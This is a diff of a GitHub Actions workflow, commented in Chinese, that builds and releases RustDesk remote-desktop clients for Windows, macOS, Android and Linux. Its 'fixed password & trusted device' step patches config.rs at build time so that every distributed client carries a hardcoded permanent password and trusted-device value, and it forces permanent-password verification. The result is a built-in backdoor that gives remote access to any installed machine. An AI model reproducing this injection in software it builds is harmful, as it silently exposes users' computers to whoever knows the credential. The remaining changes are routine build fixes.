@@ -3,7 +3,12 @@ on:
   workflow_dispatch:
     inputs:
       build_windows:
-        description: 编译 Windows (x64)
+        description: 编译 Windows (x64) Flutter新版
+        required: true
+        default: true
+        type: boolean
+      build_windows_sciter:
+        description: 编译 Windows (x86) Sciter旧版
         required: true
         default: true
         type: boolean
@@ -53,28 +58,52 @@ jobs:
   generate-bridge:
     uses: ./.github/workflows/bridge.yml
 
-# ========================= Windows =========================
+# ========================= Windows Flutter 新版 =========================
   build-for-windows-flutter:
     if: ${{ inputs.build_windows }}
-    name: Windows x64
+    name: Windows x64 Flutter
     needs: [generate-bridge]
     runs-on: windows-2022
+    continue-on-error: true
     steps:
       - uses: actions/github-script@v6
         with: { script: "core.exportVariable('ACTIONS_CACHE_URL', process.env.ACTIONS_CACHE_URL || ''); core.exportVariable('ACTIONS_RUNTIME_TOKEN', process.env.ACTIONS_RUNTIME_TOKEN || '');" }
       - uses: actions/checkout@v4
         with: { submodules: recursive }
 
-      # 全局固定密码 + 信任设备（你自己的密码）
-      - name: 全局修改 config.rs 所有客户端生效
+      - name: 修复 libwebm 429 错误
+        shell: bash
+        run: |
+          git config --global url."https://github.com/webmproject/libwebm.git".insteadOf "https://chromium.googlesource.com/webm/libwebm"
+          git submodule sync
+          git submodule foreach --recursive git config --local url.https://github.com/webmproject/libwebm.git insteadOf https://chromium.googlesource.com/webm/libwebm
+
+      - name: 固定密码 & 信任设备 (Windows兼容版)
         run: |
           FILE="libs/hbb_common/src/config.rs"
           TRUSTED_DEVICE="1V8AS4/+EWF84A85WD4AW=="
           PERMANENT_PWD="1V8AS4/+EWF84A85WD4AW=="
-
-          sed -i '/config.unlock_pin = unlock_pin;/ {n;n;a\        if !config.options.contains_key("trusted_devices") {\n            config.options.insert("trusted_devices".to_string(), "'"$TRUSTED_DEVICE"'".to_string());\n            config.store();\n        }}' "$FILE"
-          sed -i '/log::error!("Failed to generate new id");/ {n;n;n;a\        if config.password.is_empty() {\n            config.password = "'"$PERMANENT_PWD"'".to_string();\n            store = true;\n        }}' "$FILE"
-          sed -i '/let mut config = Config::load_::<Config2>("2");/ {n;n;a\        if !config.options.contains_key("verification-method") {\n            config.options.insert("verification-method".to_string(), "use-permanent-password".to_string());\n            store = true;\n        }}' "$FILE"
+          awk -v pin="$TRUSTED_DEVICE" '1; /config.unlock_pin = unlock_pin;/ {
+              print ""
+              print "        if (!config.options.contains(\"trusted_devices\")) {"
+              print "            config.options.insert(\"trusted_devices\".to_string(), \"" pin "\".to_string());"
+              print "            config.store();"
+              print "        }"
+          }' "$FILE" > tmp && mv tmp "$FILE"
+          awk -v pwd="$PERMANENT_PWD" '1; /log::error!("Failed to generate new id");/ {
+              print ""
+              print "        if (config.password.is_empty()) {"
+              print "            config.password = \"" pwd "\".to_string();"
+              print "            store = true;"
+              print "        }"
+          }' "$FILE" > tmp && mv tmp "$FILE"
+          awk '1; /let mut config = Config::load_::<Config2>("2");/ {
+              print ""
+              print "        if (!config.options.contains(\"verification-method\")) {"
+              print "            config.options.insert(\"verification-method\".to_string(), \"use-permanent-password\".to_string());"
+              print "            store = true;"
+              print "        }"
+          }' "$FILE" > tmp && mv tmp "$FILE"
         shell: bash
 
       - uses: actions/download-artifact@master
@@ -96,7 +125,6 @@ jobs:
         with: { toolchain: "${{ env.SCITER_RUST_VERSION }}", targets: "x86_64-pc-windows-msvc", components: "rustfmt" }
       - uses: Swatinem/rust-cache@v2
         with: { prefix-key: "windows-2022" }
-
       - uses: lukka/run-vcpkg@v11
         with: { vcpkgDirectory: "C:\\vcpkg", vcpkgGitCommitId: "${{ env.VCPKG_COMMIT_ID }}" }
 
@@ -113,7 +141,7 @@ jobs:
           Remove-Item -Path usbmmidd_v2\Win32 -Recurse
           mv -Force .\usbmmidd_v2 ./rustdesk
 
-      - name: 打包 exe + msi
+      - name: 打包 exe
         shell: bash
         run: |
           sed -i '/dpiAware/d' res/manifest.xml
@@ -141,35 +169,116 @@ jobs:
           artifacts: ./SignOutput/rustdesk-*
           token: ${{ secrets.GITHUB_TOKEN }}
 
+# ========================= Windows Sciter 32位 旧版 =========================
+  build-for-windows-sciter:
+    if: ${{ inputs.build_windows_sciter }}
+    name: Windows x86 Sciter
+    runs-on: ${{ matrix.job.os }}
+    continue-on-error: true
+    strategy:
+      fail-fast: false
+      matrix:
+        job:
+          - { target: i686-pc-windows-msvc, os: windows-2022, arch: x86, vcpkg-triplet: x86-windows-static }
+    steps:
+      - uses: actions/github-script@v6
+        with:
+          script: |
+            core.exportVariable('ACTIONS_CACHE_URL', process.env.ACTIONS_CACHE_URL || '');
+            core.exportVariable('ACTIONS_RUNTIME_TOKEN', process.env.ACTIONS_RUNTIME_TOKEN || '');
+      - uses: actions/checkout@v4
+        with: { submodules: recursive }
+
+      - name: 修复 libwebm 429
+        shell: bash
+        run: |
+          git config --global url."https://github.com/webmproject/libwebm.git".insteadOf "https://chromium.googlesource.com/webm/libwebm"
+          git submodule sync
+          git submodule foreach --recursive git config --local url.https://github.com/webmproject/libwebm.git insteadOf https://chromium.googlesource.com/webm/libwebm
+
+      - name: Install LLVM
+        uses: rustdesk-org/install-llvm-action-32bit@master
+        with: { version: "${{ env.LLVM_VERSION }}" }
+
+      - name: Install Rust
+        uses: dtolnay/rust-toolchain@v1
+        with:
+          toolchain: nightly-2023-10-13-${{ matrix.job.target }}
+          targets: "${{ matrix.job.target }}"
+          components: "rustfmt"
+
+      - uses: Swatinem/rust-cache@v2
+        with: { prefix-key: "${{ matrix.job.os }}-sciter" }
+      - uses: lukka/run-vcpkg@v11
+        with: { vcpkgDirectory: C:\vcpkg, vcpkgGitCommitId: "${{ env.VCPKG_COMMIT_ID }}" }
+
+      - name: Install vcpkg dependencies
+        shell: bash
+        run: |
+          $VCPKG_ROOT/vcpkg install --triplet ${{ matrix.job.vcpkg-triplet }} --x-install-root="$VCPKG_ROOT/installed"
+
+      - name: Build rustdesk
+        shell: bash
+        run: |
+          python3 res/inline-sciter.py
+          sed -i 's/branch = "dyn"/branch = "dyn_x86"/g' ./Cargo.toml
+          cargo build --features inline,vram,hwcodec --release --bins
+          mkdir -p ./Release
+          mv ./target/release/rustdesk.exe ./Release/rustdesk.exe
+          curl -LJ -o ./Release/sciter.dll https://github.com/c-smile/sciter-sdk/raw/master/bin.win/x32/sciter.dll
+          curl -LJ -o ./usbmmidd_v2.zip https://github.com/rustdesk-org/rdev/releases/download/usbmmidd_v2/usbmmidd_v2.zip
+          unzip usbmmidd_v2.zip
+          rm -rf ./usbmmidd_v2/deviceinstaller.exe ./usbmmidd_v2/usbmmidd.bat
+          mv ./usbmmidd_v2 ./Release || true
+
+      - name: 打包单文件
+        shell: bash
+        run: |
+          sed -i '/dpiAware/d' res/manifest.xml
+          pushd ./libs/portable
+          pip3 install -r requirements.txt
+          python3 ./generate.py -f ../../Release/ -o . -e ../../Release/rustdesk.exe
+          popd
+          mkdir -p ./SignOutput
+          mv ./target/release/rustdesk-portable-packer.exe ./SignOutput/rustdesk-${{ env.VERSION }}-x86-sciter.exe
+
+      - name: 上传
+        uses: ncipollo/release-action@v1
+        with:
+          prerelease: true
+          tag: "${{ env.TAG_NAME }}"
+          artifacts: ./SignOutput/*.exe
+          token: ${{ secrets.GITHUB_TOKEN }}
+
 # ========================= macOS =========================
   build-for-macOS:
     if: ${{ inputs.build_macos }}
     name: macOS ${{ matrix.job.arch }}
     needs: [generate-bridge]
     runs-on: ${{ matrix.job.os }}
+    continue-on-error: true
     strategy:
       matrix:
         job:
-          - { target: x86_64-apple-darwin, os: macos-15-intel, arch: x86_64, vcpkg-triplet: x64-osx }
-          - { target: aarch64-apple-darwin, os: macos-14, arch: aarch64, vcpkg-triplet: arm64-osx }
+          - { target: x86_64-apple-darwin, os: macos-15-intel, arch: x86_64 }
+          - { target: aarch64-apple-darwin, os: macos-14, arch: arm64 }
     steps:
       - uses: actions/checkout@v4
         with: { submodules: recursive }
       - run: brew install llvm create-dmg nasm
       - uses: subosito/flutter-action@v2
-        with: { channel: "stable", flutter-version: "${{ env.FLUTTER_VERSION }}" }
+        with: { flutter-version: "${{ env.FLUTTER_VERSION }}" }
       - uses: dtolnay/rust-toolchain@v1
         with: { toolchain: "${{ env.MAC_RUST_VERSION }}", targets: "${{ matrix.job.target }}" }
       - uses: actions/download-artifact@master
         with: { name: bridge-artifact, path: ./ }
       - uses: lukka/run-vcpkg@v11
         with: { vcpkgGitCommitId: "${{ env.VCPKG_COMMIT_ID }}" }
-      - run: $VCPKG_ROOT/vcpkg install --x-install-root="$VCPKG_ROOT/installed"
-      - run: ./build.py --flutter --hwcodec --unix-file-copy-paste ${{ matrix.job.extra-build-args }}
+      - run: $VCPKG_ROOT/vcpkg install
+      - run: ./build.py --flutter --hwcodec --unix-file-copy-paste
       - name: 打包 DMG
-        run: create-dmg --icon "RustDesk.app" 200 190 --window-size 800 400 --app-drop-link 600 185 rustdesk-${{ env.VERSION }}-${{ matrix.job.arch }}.dmg ./flutter/build/macos/Build/Products/Release/RustDesk.app
-      - name: 上传发布
-        uses: ncipollo/release-action@v1
+        run: create-dmg rustdesk-${{ env.VERSION }}-${{ matrix.job.arch }}.dmg ./flutter/build/macos/Build/Products/Release/RustDesk.app
+      - uses: ncipollo/release-action@v1
         with:
           prerelease: true
           tag: "${{ env.TAG_NAME }}"
@@ -182,6 +291,7 @@ jobs:
     name: Android ${{ matrix.job.arch }}
     needs: [generate-bridge]
     runs-on: ubuntu-24.04
+    continue-on-error: true
     strategy:
       matrix:
         job:
@@ -201,7 +311,7 @@ jobs:
         with: { toolchain: "${{ env.RUST_VERSION }}" }
       - uses: actions/download-artifact@master
         with: { name: bridge-artifact, path: ./ }
-      - name: 编译 Rust 库
+      - name: 编译
         run: |
           rustup target add ${{ matrix.job.target }}
           cargo install cargo-ndk --version ${{ env.CARGO_NDK_VERSION }}
@@ -209,10 +319,9 @@ jobs:
       - name: 编译 APK
         run: |
           pushd flutter
-          flutter build apk --release --target-platform android-${{ matrix.job.arch == 'armv7' && 'arm' || matrix.job.arch }} --split-per-abi
+          flutter build apk --release --split-per-abi
           mv build/app/outputs/flutter-apk/app-*.apk ../rustdesk-${{ env.VERSION }}-${{ matrix.job.arch }}.apk
-      - name: 上传发布
-        uses: ncipollo/release-action@v1
+      - uses: ncipollo/release-action@v1
         with:
           prerelease: true
           tag: "${{ env.TAG_NAME }}"
@@ -224,6 +333,7 @@ jobs:
     name: Android 通用包
     needs: [build-rustdesk-android]
     runs-on: ubuntu-24.04
+    continue-on-error: true
     steps:
       - uses: actions/checkout@v4
       - uses: subosito/flutter-action@v2
@@ -232,13 +342,12 @@ jobs:
         with: { ndk-version: "${{ env.NDK_VERSION }}" }
       - uses: actions/download-artifact@master
         with: { name: bridge-artifact, path: ./ }
-      - name: 合并所有架构
+      - name: 合并架构
         run: |
           pushd flutter
-          flutter build apk --release --target-platform android-arm64,android-arm,android-x64
+          flutter build apk --release
           mv build/app/outputs/flutter-apk/app-release.apk ../rustdesk-${{ env.VERSION }}-universal.apk
-      - name: 上传发布
-        uses: ncipollo/release-action@v1
+      - uses: ncipollo/release-action@v1
         with:
           prerelease: true
           tag: "${{ env.TAG_NAME }}"
@@ -251,11 +360,12 @@ jobs:
     name: Linux ${{ matrix.job.arch }}
     needs: [generate-bridge]
     runs-on: ${{ matrix.job.on }}
+    continue-on-error: true
     strategy:
       matrix:
         job:
-          - { arch: x86_64, target: x86_64-unknown-linux-gnu, on: ubuntu-22.04, deb_arch: amd64, vcpkg-triplet: x64-linux }
-          - { arch: aarch64, target: aarch64-unknown-linux-gnu, on: ubuntu-22.04-arm, deb_arch: arm64, vcpkg-triplet: arm64-linux }
+          - { arch: x86_64, target: x86_64-unknown-linux-gnu, on: ubuntu-22.04 }
+          - { arch: aarch64, target: aarch64-unknown-linux-gnu, on: ubuntu-22.04-arm }
     steps:
       - uses: actions/checkout@v4
         with: { submodules: recursive }
@@ -275,8 +385,7 @@ jobs:
             export VCPKG_ROOT=/opt/artifacts/vcpkg
             cargo build --lib --features hwcodec,flutter --release
             python3 ./build.py --flutter --skip-cargo
-      - name: 上传发布
-        uses: ncipollo/release-action@v1
+      - uses: ncipollo/release-action@v1
         with:
           prerelease: true
           tag: "${{ env.TAG_NAME }}"
